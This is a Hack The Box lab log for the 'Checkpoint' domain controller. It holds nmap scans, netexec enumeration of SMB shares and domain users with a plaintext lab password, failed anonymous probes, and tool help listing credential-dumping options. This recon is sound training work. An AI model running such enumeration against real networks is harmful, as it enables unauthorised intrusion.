# Checkpoint from htb machine ip 10.129.5.103
# enumeration
# Nmap

```nmap

sudo nmap -T4 -sC -sV $ip -p53,88,135,139,389,445,593,636,3268,3269,5985 -o nmap2.txt
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-18 09:42 +0530
Stats: 0:01:35 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 94.32% done; ETC: 09:44 (0:00:00 remaining)
Nmap scan report for 10.129.5.103 (10.129.5.103)
Host is up (0.56s latency).

PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-06-18 11:12:47Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m59s
| smb2-time: 
|   date: 2026-06-18T11:13:26
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.68 seconds

```

#enuming with netexec

```
netexec smb checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --shares
SMB         10.129.5.103    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.5.103    445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
SMB         10.129.5.103    445    DC01             [*] Enumerated shares
SMB         10.129.5.103    445    DC01             Share           Permissions     Remark
SMB         10.129.5.103    445    DC01             -----           -----------     ------
SMB         10.129.5.103    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.5.103    445    DC01             C$                              Default share
SMB         10.129.5.103    445    DC01             DevDrop         READ            VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         10.129.5.103    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.5.103    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.5.103    445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.5.103    445    DC01             VMBackups                       


netexec smb checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --users

SMB         10.129.5.103    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.5.103    445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
SMB         10.129.5.103    445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.5.103    445    DC01             Administrator                 2026-05-09 16:16:34 0       Built-in account for administering the computer/domain 
SMB         10.129.5.103    445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.5.103    445    DC01             krbtgt                        2026-05-09 08:41:01 0       Key Distribution Center Service Account 
SMB         10.129.5.103    445    DC01             alex.turner                   2026-05-09 09:00:08 0        
SMB         10.129.5.103    445    DC01             ryan.brooks                   2026-05-10 13:46:18 0        
SMB         10.129.5.103    445    DC01             svc_deploy                    2026-05-09 09:01:19 0       Deployment service account 
SMB         10.129.5.103    445    DC01             james.harper                  2026-05-09 09:02:53 0        
SMB         10.129.5.103    445    DC01             sarah.mitchell                2026-05-09 09:02:58 0        
SMB         10.129.5.103    445    DC01             emily.carter                  2026-05-09 09:03:05 0        
SMB         10.129.5.103    445    DC01             david.reynolds                2026-05-09 09:03:11 0        
SMB         10.129.5.103    445    DC01             jessica.coleman               2026-05-09 09:03:15 0        
SMB         10.129.5.103    445    DC01             lauren.flores                 2026-05-09 09:03:21 0        
SMB         10.129.5.103    445    DC01             michael.torres                2026-05-09 09:03:28 0        
SMB         10.129.5.103    445    DC01             kevin.patterson               2026-05-09 09:03:33 0        
SMB         10.129.5.103    445    DC01             brian.jenkins                 2026-05-09 09:03:37 0        
SMB         10.129.5.103    445    DC01             megan.perry                   2026-05-09 09:03:42 0        
SMB         10.129.5.103    445    DC01             max.palmer                    2026-05-26 01:25:15 0        
SMB         10.129.5.103    445    DC01             [*] Enumerated 17 local users: CHECKPOINT

```

# pausing the work

- this is where i take a pause

```

 Thu 18 Jun - 09:35  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 1☀ 
 @user  ip=10.129.5.103             

 Thu 18 Jun - 09:39  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 1☀ 
 @user  ls

 Thu 18 Jun - 09:39  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 1☀ 
 @user  sudo nmap -Pn $ip  -o nmap.txt -vvv\
> 
[sudo] password for user: 
Warning: The -o option is deprecated. Please use -oN
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-18 09:39 +0530
Initiating Parallel DNS resolution of 1 host. at 09:39
Completed Parallel DNS resolution of 1 host. at 09:39, 0.07s elapsed
DNS resolution of 1 IPs took 0.07s. Mode: Async [#: 2, OK: 1, NX: 0, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 09:39
Scanning 10.129.5.103 (10.129.5.103) [1000 ports]
Discovered open port 53/tcp on 10.129.5.103
Discovered open port 135/tcp on 10.129.5.103
Discovered open port 445/tcp on 10.129.5.103
Discovered open port 139/tcp on 10.129.5.103
Discovered open port 3268/tcp on 10.129.5.103
Discovered open port 88/tcp on 10.129.5.103
Discovered open port 593/tcp on 10.129.5.103
Discovered open port 389/tcp on 10.129.5.103
Discovered open port 636/tcp on 10.129.5.103
Discovered open port 3269/tcp on 10.129.5.103
Discovered open port 5985/tcp on 10.129.5.103
Discovered open port 464/tcp on 10.129.5.103
Completed SYN Stealth Scan at 09:40, 25.30s elapsed (1000 total ports)
Nmap scan report for 10.129.5.103 (10.129.5.103)
Host is up, received user-set (0.28s latency).
Scanned at 2026-06-18 09:39:46 IST for 26s
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE          REASON
53/tcp   open  domain           syn-ack ttl 127
88/tcp   open  kerberos-sec     syn-ack ttl 127
135/tcp  open  msrpc            syn-ack ttl 127
139/tcp  open  netbios-ssn      syn-ack ttl 127
389/tcp  open  ldap             syn-ack ttl 127
445/tcp  open  microsoft-ds     syn-ack ttl 127
464/tcp  open  kpasswd5         syn-ack ttl 127
593/tcp  open  http-rpc-epmap   syn-ack ttl 127
636/tcp  open  ldapssl          syn-ack ttl 127
3268/tcp open  globalcatLDAP    syn-ack ttl 127
3269/tcp open  globalcatLDAPssl syn-ack ttl 127
5985/tcp open  wsman            syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 25.44 seconds
           Raw packets sent: 1998 (87.912KB) | Rcvd: 22 (968B)

 Thu 18 Jun - 09:40  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  sudo nmap -T4 -sC -sV $ip -p53,88,135,139,389,445,593,636,3268,3269,5985 -o nmap2.txt
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-18 09:42 +0530
Stats: 0:01:35 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 94.32% done; ETC: 09:44 (0:00:00 remaining)
Nmap scan report for 10.129.5.103 (10.129.5.103)
Host is up (0.56s latency).

PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-06-18 11:12:47Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m59s
| smb2-time: 
|   date: 2026-06-18T11:13:26
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.68 seconds

 Thu 18 Jun - 09:44  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  



 ✘  Thu 18 Jun - 09:45  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  vim /etc/hosts

[No write since last change]
zsh:1: command not found: q

shell returned 127

Press ENTER or type command to continue

 Thu 18 Jun - 09:46  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  sudo vim /etc/hosts

 Thu 18 Jun - 09:47  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  nxc          
usage: nxc [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--no-progress] [--log LOG] [--verbose | --debug] [-6] [--dns-server DNS_SERVER]
           [--dns-tcp] [--dns-timeout DNS_TIMEOUT]
           {wmi,winrm,vnc,ssh,rdp,nfs,ldap,ftp,smb,mssql} ...

     .   .
    .|   |.     _   _          _     _____
    ||   ||    | \ | |   ___  | |_  | ____| __  __   ___    ___
    \\( )//    |  \| |  / _ \ | __| |  _|   \ \/ /  / _ \  / __|
    .=[ ]=.    | |\  | |  __/ | |_  | |___   >  <  |  __/ | (__
   / /˙-˙\ \   |_| \_|  \___|  \__| |_____| /_/\_\  \___|  \___|
   ˙ \   / ˙
     ˙   ˙

    The network execution tool
    Maintained as an open source project by @NeffIsBack, @MJHallenbeck, @_zblurx

    For documentation and usage examples, visit: https://www.netexec.wiki/

    Version : 1.5.0
    Codename: Yippie-Ki-Yay
    Commit  : 6ae1f0b9
    

options:
  -h, --help            show this help message and exit

Generic Options:
  --version             Display nxc version
  -t, --threads THREADS
                        set how many concurrent threads to use
  --timeout TIMEOUT     max timeout in seconds of each thread
  --jitter INTERVAL     sets a random delay between each authentication

Output Options:
  --no-progress         do not displaying progress bar during scan
  --log LOG             export result into a custom file
  --verbose             enable verbose output
  --debug               enable debug level information

DNS:
  -6                    Enable force IPv6
  --dns-server DNS_SERVER
                        Specify DNS server (default: Use hosts file & System DNS)
  --dns-tcp             Use TCP instead of UDP for DNS queries
  --dns-timeout DNS_TIMEOUT
                        DNS query timeout in seconds

Available Protocols:
  {wmi,winrm,vnc,ssh,rdp,nfs,ldap,ftp,smb,mssql}
    wmi                 own stuff using WMI
    winrm               own stuff using WINRM
    vnc                 own stuff using VNC
    ssh                 own stuff using SSH
    rdp                 own stuff using RDP
    nfs                 own stuff using NFS
    ldap                own stuff using LDAP
    ftp                 own stuff using FTP
    smb                 own stuff using SMB
    mssql               own stuff using MSSQL

 ✘  Thu 18 Jun - 09:47  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  nxc smb
usage: nxc smb [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--no-progress] [--log LOG] [--verbose | --debug] [-6] [--dns-server DNS_SERVER]
               [--dns-tcp] [--dns-timeout DNS_TIMEOUT] [-u USERNAME [USERNAME ...]] [-p PASSWORD [PASSWORD ...]] [-id CRED_ID [CRED_ID ...]] [--ignore-pw-decoding]
               [--no-bruteforce] [--continue-on-success] [--gfail-limit LIMIT] [--ufail-limit LIMIT] [--fail-limit LIMIT] [-k] [--use-kcache]
               [--aesKey AESKEY [AESKEY ...]] [--kdcHost KDCHOST] [--pfx-cert PFXCERT] [--pfx-base64 PFXB64] [--pfx-pass PFXPASS] [--pem-cert PEMCERT] [--pem-key PEMKEY]
               [-M MODULE] [-o MODULE_OPTION [MODULE_OPTION ...]] [-L [LIST_MODULES]] [--options] [-H HASH [HASH ...]] [--delegate DELEGATE] [--delegate-spn DELEGATE_SPN]
               [--generate-st GENERATE_ST] [--self] [-d DOMAIN | --local-auth] [--port PORT] [--share SHARE] [--smb-server-port SMB_SERVER_PORT] [--no-smbv1]
               [--no-admin-check] [--gen-relay-list OUTPUT_FILE] [--smb-timeout SMB_TIMEOUT] [--laps [LAPS]] [--generate-hosts-file GENERATE_HOSTS_FILE]
               [--generate-krb5-file GENERATE_KRB5_FILE] [--generate-tgt GENERATE_TGT] [--sam [{secdump,regdump}]] [--lsa [{secdump,regdump}]] [--ntds [{vss,drsuapi}]]
               [--kerberos-keys] [--history | --enabled] [--user USERNTDS] [--dpapi [{cookies,nosystem} ...]] [--sccm [{wmi,disk}]] [--mkfile MKFILE] [--pvk PVK]
               [--shares [SHARES]] [--exclude-shares EXCLUDE_SHARES [EXCLUDE_SHARES ...]] [--dir [DIR]] [--interfaces] [--no-write-check]
               [--filter-shares FILTER_SHARES [FILTER_SHARES ...]] [--disks] [--users [USER ...]] [--users-export USERS_EXPORT] [--groups [GROUP]] [--local-groups [GROUP]]
               [--computers [COMPUTER]] [--pass-pol] [--rid-brute [MAX_RID]] [--smb-sessions] [--reg-sessions [REG_SESSIONS]] [--loggedon-users [LOGGEDON_USERS]]
               [--loggedon-users-filter LOGGEDON_USERS_FILTER] [--qwinsta [QWINSTA]] [--tasklist [TASKLIST]] [--taskkill TASKKILL] [--wmi QUERY]
               [--wmi-namespace NAMESPACE] [--spider SHARE] [--spider-folder FOLDER] [--content] [--exclude-dirs DIR_LIST] [--depth DEPTH] [--only-files] [--silent]
               [--pattern PATTERN [PATTERN ...] | --regex REGEX [REGEX ...]] [--put-file FILE FILE] [--get-file FILE FILE] [--append-host]
               [--exec-method {wmiexec,smbexec,mmcexec,atexec}] [--dcom-timeout DCOM_TIMEOUT] [--get-output-tries GET_OUTPUT_TRIES] [--codec CODEC] [--no-output]
               [-x COMMAND | -X PS_COMMAND] [--obfs] [--amsi-bypass FILE] [--clear-obfscripts] [--force-ps32] [--no-encode]
               target [target ...]
nxc smb: error: the following arguments are required: target

 ✘  Thu 18 Jun - 09:49  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  nxc smb --dns-server checkpoint.htb
usage: nxc smb [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--no-progress] [--log LOG] [--verbose | --debug] [-6] [--dns-server DNS_SERVER]
               [--dns-tcp] [--dns-timeout DNS_TIMEOUT] [-u USERNAME [USERNAME ...]] [-p PASSWORD [PASSWORD ...]] [-id CRED_ID [CRED_ID ...]] [--ignore-pw-decoding]
               [--no-bruteforce] [--continue-on-success] [--gfail-limit LIMIT] [--ufail-limit LIMIT] [--fail-limit LIMIT] [-k] [--use-kcache]
               [--aesKey AESKEY [AESKEY ...]] [--kdcHost KDCHOST] [--pfx-cert PFXCERT] [--pfx-base64 PFXB64] [--pfx-pass PFXPASS] [--pem-cert PEMCERT] [--pem-key PEMKEY]
               [-M MODULE] [-o MODULE_OPTION [MODULE_OPTION ...]] [-L [LIST_MODULES]] [--options] [-H HASH [HASH ...]] [--delegate DELEGATE] [--delegate-spn DELEGATE_SPN]
               [--generate-st GENERATE_ST] [--self] [-d DOMAIN | --local-auth] [--port PORT] [--share SHARE] [--smb-server-port SMB_SERVER_PORT] [--no-smbv1]
               [--no-admin-check] [--gen-relay-list OUTPUT_FILE] [--smb-timeout SMB_TIMEOUT] [--laps [LAPS]] [--generate-hosts-file GENERATE_HOSTS_FILE]
               [--generate-krb5-file GENERATE_KRB5_FILE] [--generate-tgt GENERATE_TGT] [--sam [{secdump,regdump}]] [--lsa [{secdump,regdump}]] [--ntds [{drsuapi,vss}]]
               [--kerberos-keys] [--history | --enabled] [--user USERNTDS] [--dpapi [{nosystem,cookies} ...]] [--sccm [{disk,wmi}]] [--mkfile MKFILE] [--pvk PVK]
               [--shares [SHARES]] [--exclude-shares EXCLUDE_SHARES [EXCLUDE_SHARES ...]] [--dir [DIR]] [--interfaces] [--no-write-check]
               [--filter-shares FILTER_SHARES [FILTER_SHARES ...]] [--disks] [--users [USER ...]] [--users-export USERS_EXPORT] [--groups [GROUP]] [--local-groups [GROUP]]
               [--computers [COMPUTER]] [--pass-pol] [--rid-brute [MAX_RID]] [--smb-sessions] [--reg-sessions [REG_SESSIONS]] [--loggedon-users [LOGGEDON_USERS]]
               [--loggedon-users-filter LOGGEDON_USERS_FILTER] [--qwinsta [QWINSTA]] [--tasklist [TASKLIST]] [--taskkill TASKKILL] [--wmi QUERY]
               [--wmi-namespace NAMESPACE] [--spider SHARE] [--spider-folder FOLDER] [--content] [--exclude-dirs DIR_LIST] [--depth DEPTH] [--only-files] [--silent]
               [--pattern PATTERN [PATTERN ...] | --regex REGEX [REGEX ...]] [--put-file FILE FILE] [--get-file FILE FILE] [--append-host]
               [--exec-method {mmcexec,atexec,smbexec,wmiexec}] [--dcom-timeout DCOM_TIMEOUT] [--get-output-tries GET_OUTPUT_TRIES] [--codec CODEC] [--no-output]
               [-x COMMAND | -X PS_COMMAND] [--obfs] [--amsi-bypass FILE] [--clear-obfscripts] [--force-ps32] [--no-encode]
               target [target ...]
nxc smb: error: the following arguments are required: target

 ✘  Thu 18 Jun - 09:50  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  nxc smb -d checkpoint.htb    
usage: nxc smb [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--no-progress] [--log LOG] [--verbose | --debug] [-6] [--dns-server DNS_SERVER]
               [--dns-tcp] [--dns-timeout DNS_TIMEOUT] [-u USERNAME [USERNAME ...]] [-p PASSWORD [PASSWORD ...]] [-id CRED_ID [CRED_ID ...]] [--ignore-pw-decoding]
               [--no-bruteforce] [--continue-on-success] [--gfail-limit LIMIT] [--ufail-limit LIMIT] [--fail-limit LIMIT] [-k] [--use-kcache]
               [--aesKey AESKEY [AESKEY ...]] [--kdcHost KDCHOST] [--pfx-cert PFXCERT] [--pfx-base64 PFXB64] [--pfx-pass PFXPASS] [--pem-cert PEMCERT] [--pem-key PEMKEY]
               [-M MODULE] [-o MODULE_OPTION [MODULE_OPTION ...]] [-L [LIST_MODULES]] [--options] [-H HASH [HASH ...]] [--delegate DELEGATE] [--delegate-spn DELEGATE_SPN]
               [--generate-st GENERATE_ST] [--self] [-d DOMAIN | --local-auth] [--port PORT] [--share SHARE] [--smb-server-port SMB_SERVER_PORT] [--no-smbv1]
               [--no-admin-check] [--gen-relay-list OUTPUT_FILE] [--smb-timeout SMB_TIMEOUT] [--laps [LAPS]] [--generate-hosts-file GENERATE_HOSTS_FILE]
               [--generate-krb5-file GENERATE_KRB5_FILE] [--generate-tgt GENERATE_TGT] [--sam [{regdump,secdump}]] [--lsa [{regdump,secdump}]] [--ntds [{drsuapi,vss}]]
               [--kerberos-keys] [--history | --enabled] [--user USERNTDS] [--dpapi [{nosystem,cookies} ...]] [--sccm [{wmi,disk}]] [--mkfile MKFILE] [--pvk PVK]
               [--shares [SHARES]] [--exclude-shares EXCLUDE_SHARES [EXCLUDE_SHARES ...]] [--dir [DIR]] [--interfaces] [--no-write-check]
               [--filter-shares FILTER_SHARES [FILTER_SHARES ...]] [--disks] [--users [USER ...]] [--users-export USERS_EXPORT] [--groups [GROUP]] [--local-groups [GROUP]]
               [--computers [COMPUTER]] [--pass-pol] [--rid-brute [MAX_RID]] [--smb-sessions] [--reg-sessions [REG_SESSIONS]] [--loggedon-users [LOGGEDON_USERS]]
               [--loggedon-users-filter LOGGEDON_USERS_FILTER] [--qwinsta [QWINSTA]] [--tasklist [TASKLIST]] [--taskkill TASKKILL] [--wmi QUERY]
               [--wmi-namespace NAMESPACE] [--spider SHARE] [--spider-folder FOLDER] [--content] [--exclude-dirs DIR_LIST] [--depth DEPTH] [--only-files] [--silent]
               [--pattern PATTERN [PATTERN ...] | --regex REGEX [REGEX ...]] [--put-file FILE FILE] [--get-file FILE FILE] [--append-host]
               [--exec-method {mmcexec,smbexec,atexec,wmiexec}] [--dcom-timeout DCOM_TIMEOUT] [--get-output-tries GET_OUTPUT_TRIES] [--codec CODEC] [--no-output]
               [-x COMMAND | -X PS_COMMAND] [--obfs] [--amsi-bypass FILE] [--clear-obfscripts] [--force-ps32] [--no-encode]
               target [target ...]
nxc smb: error: the following arguments are required: target

 ✘  Thu 18 Jun - 09:50  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  nxc smb $ip              
SMB         10.129.5.103    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)

 Thu 18 Jun - 09:52  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  nxc smb $ip -u '' -p ''
SMB         10.129.5.103    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.5.103    445    DC01             [-] checkpoint.htb\: STATUS_ACCESS_DENIED 

 Thu 18 Jun - 09:53  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  nxc smb $ip -u '' -p '' --shares
SMB         10.129.5.103    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.5.103    445    DC01             [-] checkpoint.htb\: STATUS_ACCESS_DENIED 
SMB         10.129.5.103    445    DC01             [-] Error enumerating shares: Error occurs while reading from remote(104)

 Thu 18 Jun - 09:54  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  nxc smb $ip -u '' -p '' --pass-pol      
SMB         10.129.5.103    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.5.103    445    DC01             [-] checkpoint.htb\: STATUS_ACCESS_DENIED 

 Thu 18 Jun - 09:55  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  nxc smb $ip -u '' -p '' --users        
SMB         10.129.5.103    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.5.103    445    DC01             [-] checkpoint.htb\: STATUS_ACCESS_DENIED 

 Thu 18 Jun - 09:55  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  nxc smb $ip -u '' -p '' --groups       
SMB         10.129.5.103    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.5.103    445    DC01             [-] checkpoint.htb\: STATUS_ACCESS_DENIED 
SMB         10.129.5.103    445    DC01             [-] [REMOVED] Arg moved to the ldap protocol

 Thu 18 Jun - 09:56  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  nxc ldap $ip                     
LDAP        10.129.5.103    389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert)

 Thu 18 Jun - 09:58  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  dirsearch -u http://$ip:5985 -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -o dir 

  _|. _ _  _  _  _ _|_    v0.5.0
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 220544

Target: http://10.129.5.103:5985/

[10:01:49] Scanning: 
CTRL+C detected: Pausing threads, please wait...
[q]uit / [c]ontinue: q
[s]ave / [q]uit without saving: q

Canceled by the user

 Thu 18 Jun - 10:02  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  dirsearch -u http://$ip:5985 -w /usr/share/SecLists/Discovery/Web-Content/comman.txt -o dir  
/usr/share/SecLists/Discovery/Web-Content/comman.txt does not exist

 ✘  Thu 18 Jun - 10:02  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  dirsearch -u http://$ip:5985 -w /usr/share/SecLists/Discovery/Web-Content/common.txt -o dir  

  _|. _ _  _  _  _ _|_    v0.5.0
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 4750

Target: http://10.129.5.103:5985/

[10:03:11] Scanning: 
CTRL+C detected: Pausing threads, please wait...
[q]uit / [c]ontinue: q 
[s]ave / [q]uit without saving: q

Canceled by the user

 Thu 18 Jun - 10:04  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  nxc ldap $ip -u $user -p $password --users
usage: nxc ldap [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--no-progress] [--log LOG] [--verbose | --debug] [-6] [--dns-server DNS_SERVER]
                [--dns-tcp] [--dns-timeout DNS_TIMEOUT] [-u USERNAME [USERNAME ...]] [-p PASSWORD [PASSWORD ...]] [-id CRED_ID [CRED_ID ...]] [--ignore-pw-decoding]
                [--no-bruteforce] [--continue-on-success] [--gfail-limit LIMIT] [--ufail-limit LIMIT] [--fail-limit LIMIT] [-k] [--use-kcache]
                [--aesKey AESKEY [AESKEY ...]] [--kdcHost KDCHOST] [--pfx-cert PFXCERT] [--pfx-base64 PFXB64] [--pfx-pass PFXPASS] [--pem-cert PEMCERT] [--pem-key PEMKEY]
                [-M MODULE] [-o MODULE_OPTION [MODULE_OPTION ...]] [-L [LIST_MODULES]] [--options] [-H HASH [HASH ...] | --simple-bind] [--port PORT] [-d DOMAIN]
                [--asreproast ASREPROAST] [--kerberoasting KERBEROASTING] [--kerberoast-account KERBEROAST_ACCOUNT [KERBEROAST_ACCOUNT ...]]
                [--no-preauth-targets NO_PREAUTH_TARGETS] [--base-dn BASE_DN] [--query QUERY QUERY] [--find-delegation] [--trusted-for-delegation]
                [--password-not-required] [--admin-count] [--users [USERS ...]] [--users-export USERS_EXPORT] [--groups [GROUPS]] [--computers] [--dc-list] [--get-sid]
                [--active-users [ACTIVE_USERS ...]] [--pso] [--pass-pol] [--gmsa] [--gmsa-convert-id GMSA_CONVERT_ID] [--gmsa-decrypt-lsa GMSA_DECRYPT_LSA] [--bloodhound]
                [-c COLLECTION]
                target [target ...]
nxc ldap: error: argument -u/--username: expected at least one argument

 ✘  Thu 18 Jun - 10:04  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  nxc ldap $ip -u  -p  --users   
usage: nxc ldap [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--no-progress] [--log LOG] [--verbose | --debug] [-6] [--dns-server DNS_SERVER]
                [--dns-tcp] [--dns-timeout DNS_TIMEOUT] [-u USERNAME [USERNAME ...]] [-p PASSWORD [PASSWORD ...]] [-id CRED_ID [CRED_ID ...]] [--ignore-pw-decoding]
                [--no-bruteforce] [--continue-on-success] [--gfail-limit LIMIT] [--ufail-limit LIMIT] [--fail-limit LIMIT] [-k] [--use-kcache]
                [--aesKey AESKEY [AESKEY ...]] [--kdcHost KDCHOST] [--pfx-cert PFXCERT] [--pfx-base64 PFXB64] [--pfx-pass PFXPASS] [--pem-cert PEMCERT] [--pem-key PEMKEY]
                [-M MODULE] [-o MODULE_OPTION [MODULE_OPTION ...]] [-L [LIST_MODULES]] [--options] [-H HASH [HASH ...] | --simple-bind] [--port PORT] [-d DOMAIN]
                [--asreproast ASREPROAST] [--kerberoasting KERBEROASTING] [--kerberoast-account KERBEROAST_ACCOUNT [KERBEROAST_ACCOUNT ...]]
                [--no-preauth-targets NO_PREAUTH_TARGETS] [--base-dn BASE_DN] [--query QUERY QUERY] [--find-delegation] [--trusted-for-delegation]
                [--password-not-required] [--admin-count] [--users [USERS ...]] [--users-export USERS_EXPORT] [--groups [GROUPS]] [--computers] [--dc-list] [--get-sid]
                [--active-users [ACTIVE_USERS ...]] [--pso] [--pass-pol] [--gmsa] [--gmsa-convert-id GMSA_CONVERT_ID] [--gmsa-decrypt-lsa GMSA_DECRYPT_LSA] [--bloodhound]
                [-c COLLECTION]
                target [target ...]
nxc ldap: error: argument -u/--username: expected at least one argument

 ✘  Thu 18 Jun - 10:05  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  nxc ldap 192.168.1.0/24 -u user -p password
^CTraceback (most recent call last):
  File "netexec.py", line 219, in <module>
  File "netexec.py", line 148, in main
  File "nxc/loaders/protocolloader.py", line 14, in load_protocol
  File "<frozen importlib._bootstrap_external>", line 1023, in exec_module
  File "<frozen importlib._bootstrap>", line 488, in _call_with_frames_removed
  File "/tmp/_MEIgDWqnZ/nxc/protocols/ldap.py", line 40, in <module>
    from nxc.connection import connection
  File "<frozen importlib._bootstrap>", line 1360, in _find_and_load
  File "<frozen importlib._bootstrap>", line 1331, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 935, in _load_unlocked
